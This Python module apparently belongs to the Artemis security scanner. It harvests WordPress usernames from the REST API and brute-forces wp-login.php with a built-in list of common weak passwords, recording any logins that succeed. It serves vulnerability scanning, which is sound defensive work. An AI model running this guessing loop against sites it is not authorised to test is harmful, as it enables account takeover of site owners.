#!/usr/bin/env python3
import requests
from karton.core import Task

from artemis.binds import Application, TaskStatus
from artemis.module_base import ArtemisBase

PASSWORDS = [
    "admin",
    "administrator",
    "admin1",
    "wordpress",
    "1234",
    "12345",
    "123456",
    "123456789",
    "qwerty",
    "zaq123wsx",
]

MAX_USERNAMES_TO_CHECK = 3


class WordPressBruter(ArtemisBase):
    """
    Performs a brute force attack on WordPress credentials
    """

    identity = "wordpress_bruter"
    filters = [
        {"webapp": Application.WORDPRESS},
    ]

    def run(self, current_task: Task) -> None:
        url = current_task.get_payload("url")

        usernames = []

        try:
            users = requests.get(url + "?rest_route=/wp/v2/users").json()
            for user_entry in users:
                usernames.append(user_entry["name"])
        except Exception:
            pass

        usernames += ["admin", "administrator", "wordpress"]
        usernames = usernames[:MAX_USERNAMES_TO_CHECK]

        credentials = []
        for username in usernames:
            for password in PASSWORDS:
                content = requests.post(
                    url + "/wp-login.php",
                    data={
                        "log": username,
                        "pwd": password,
                        "wp-submit": "Log In",
                        "redirect_to": "http://127.0.0.1:8080/wp-admin/",
                        "testcookie": "1",
                    },
                    cookies={"wordpress_test_cookie": "WP%20Cookie%20check"},
                    verify=False,
                    timeout=5,
                ).content
                if "<title>Dashboard" in content.decode("utf-8", errors="ignore"):
                    credentials.append((username, password))

        if credentials:
            status = TaskStatus.INTERESTING
            status_reason = "Found working credentials for the WordPress admin: " + ", ".join(
                [username + ":" + password for username, password in credentials]
            )
        else:
            status = TaskStatus.OK
            status_reason = None
        self.db.save_task_result(task=current_task, status=status, status_reason=status_reason, data=credentials)


if __name__ == "__main__":
    WordPressBruter().loop()
